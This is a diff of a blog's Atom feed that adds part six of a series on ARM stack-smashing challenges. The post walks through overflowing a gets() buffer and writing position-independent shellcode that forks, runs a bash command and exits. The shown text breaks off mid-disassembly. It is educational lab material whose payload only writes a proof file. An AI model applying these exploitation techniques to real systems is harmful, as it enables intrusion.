@@ -1,4 +1,382 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-01-21T04:03:41+01:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Smashing ARM Stack for Fun - Part V</title><link href="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part V" /><published>2021-01-20T00:00:00+01:00</published><updated>2021-01-20T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/20/Smashing-ARM-Stack-for-Fun-Part-V.html">&lt;p&gt;&lt;a href=&quot;https://github.com/azeria-labs/ARM-challenges&quot;&gt;Fifth challenge&lt;/a&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/book-of-gehn/feed.xml" rel="self" type="application/atom+xml" /><link href="/book-of-gehn/" rel="alternate" type="text/html" /><updated>2021-01-28T00:32:04+01:00</updated><id>/book-of-gehn/feed.xml</id><title type="html">The Book of Gehn</title><subtitle></subtitle><author><name>Gehn</name></author><entry><title type="html">Smashing ARM Stack for Fun - Part VI</title><link href="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part VI" /><published>2021-01-26T00:00:00+01:00</published><updated>2021-01-26T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/26/Smashing-ARM-Stack-for-Fun-Part-VI.html">&lt;p&gt;We have the same vulnerability than we have in
+&lt;a href=&quot;/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-V.html&quot;&gt;stack4&lt;/a&gt;
+but this time we will make our own egg/shellcode.&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;same-vuln&quot;&gt;Same vuln&lt;/h2&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdisass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+ &lt;span class=&quot;err&quot;&gt;►&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1041c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;       &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lr&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10420&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10424&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10428&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x1042c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;str&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10430&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10434&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10438&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;bl&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+   &lt;span class=&quot;mh&quot;&gt;0x1043c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10440&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+   &lt;span class=&quot;mh&quot;&gt;0x10444&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;pop&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The plan is to overflow the buffer with 0x44 bytes of padding, then 4
+bytes with the first return address.&lt;/p&gt;
+
+&lt;p&gt;Nothing new. But the fun is just about to begin…&lt;/p&gt;
+
+&lt;h2 id=&quot;planning-the-eggexploit&quot;&gt;Planning the egg/exploit&lt;/h2&gt;
+
+&lt;p&gt;We want something standard but slightly fancy:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;spawn a shell an run an arbitrary command&lt;/li&gt;
+  &lt;li&gt;wait for the spawned process to finish&lt;/li&gt;
+  &lt;li&gt;exit the program&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This translates to the following C code:&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// child&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo 'pwn!' &amp;gt; pwned_proof&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// parent&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;wait4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;child&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// catch all exit&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;exit_group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The last &lt;code class=&quot;highlighter-rouge&quot;&gt;exit_group&lt;/code&gt; is a catch all: if &lt;code class=&quot;highlighter-rouge&quot;&gt;fork&lt;/code&gt; fails or &lt;code class=&quot;highlighter-rouge&quot;&gt;execve&lt;/code&gt; fails
+we want to have a deterministic output. The same for the parent process
+after &lt;code class=&quot;highlighter-rouge&quot;&gt;wait4&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;syscalls&quot;&gt;Syscalls&lt;/h2&gt;
+
+&lt;p&gt;&lt;label for=&quot;mn-72ba81e919d274b14590783257f58039&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-72ba81e919d274b14590783257f58039&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;References: &lt;a href=&quot;https://syscalls.w3challs.com/?arch=arm_strong&quot;&gt;w3challs&lt;/a&gt;
+and
+&lt;a href=&quot;https://github.com/torvalds/linux/blob/v4.17/arch/arm/tools/syscall.tbl&quot;&gt;Linux kernel&lt;/a&gt;
+ &lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;This is a summary of the syscalls’ numbers and arguments:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;            r7      r0      r1      r2      r3
+syscall     num     arg1    arg2    arg3    argv4
+fork        0x02
+execve      0x0b    &quot;/bi..&quot; argv    envp
+wait4       0x72    pid     NULL    0       NULL
+exit_group  0xf8    num
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;argv&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;envp&lt;/code&gt;, are arrays of pointers with a
+pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; marking the end of the array.&lt;/p&gt;
+
+&lt;p&gt;In Linux it is possible to pass a &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; instead an array with a single
+pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt;. This could be used for &lt;code class=&quot;highlighter-rouge&quot;&gt;envp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;However:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;On Linux, &lt;code class=&quot;highlighter-rouge&quot;&gt;argv&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;envp&lt;/code&gt; can be specified as &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt;.  In both cases,
+this has the same effect as specifying  the  argument
+as  a  pointer to a list containing a single null pointer.
+&lt;strong&gt;Do not take advantage of this nonstandard and nonportable misfeature!&lt;/strong&gt;
+On many other UNIX systems, specifying &lt;code class=&quot;highlighter-rouge&quot;&gt;argv&lt;/code&gt;
+as NULL will result in an  error  (&lt;code class=&quot;highlighter-rouge&quot;&gt;EFAULT&lt;/code&gt;). &lt;em&gt;Some&lt;/em&gt;
+other UNIX systems treat the &lt;code class=&quot;highlighter-rouge&quot;&gt;envp==NULL&lt;/code&gt; case the same as Linux.
+&lt;cite class=&quot;epigraph&quot;&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man2/execve.2.html&quot;&gt;man execve(2)&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;No problem! We can design a single array in the stack to fulfill both:&lt;/p&gt;
+
+&lt;figure&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;object align=&quot;middle&quot; data=&quot;/book-of-gehn/uml/2f07df8e6afcd7cdcd72a2760a5ca3fb.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;/object&gt;&lt;/figure&gt;
+
+&lt;p&gt;In assembly this translates to:&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;              &lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; &amp;amp;argv[3]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Largv2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Largv1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Largv0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;; &amp;amp;argv[0]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;But why &lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt; and not &lt;code class=&quot;highlighter-rouge&quot;&gt;mov&lt;/code&gt;?&lt;/p&gt;
+
+&lt;h2 id=&quot;position-independent-code&quot;&gt;Position independent code&lt;/h2&gt;
+
+&lt;p&gt;The exploit will be loaded in a piece of executable memory but we cannot
+know &lt;em&gt;a priori&lt;/em&gt; where.&lt;/p&gt;
+
+&lt;p&gt;Therefore, branches and addresses &lt;strong&gt;must&lt;/strong&gt; be &lt;em&gt;relative&lt;/em&gt; to the program
+counter.&lt;/p&gt;
+
+&lt;p&gt;We cannot just say &lt;code class=&quot;highlighter-rouge&quot;&gt;mov r2, label&lt;/code&gt; as we will hardcoding the address of
+&lt;code class=&quot;highlighter-rouge&quot;&gt;label&lt;/code&gt;; we need to use &lt;code class=&quot;highlighter-rouge&quot;&gt;add&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;00000020&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Lchild&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e3a03000&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28f204c&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; 0x4c  argv2&lt;/span&gt;
+  &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e28f1044&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;add&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;68&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;; 0x44  argv1&lt;/span&gt;
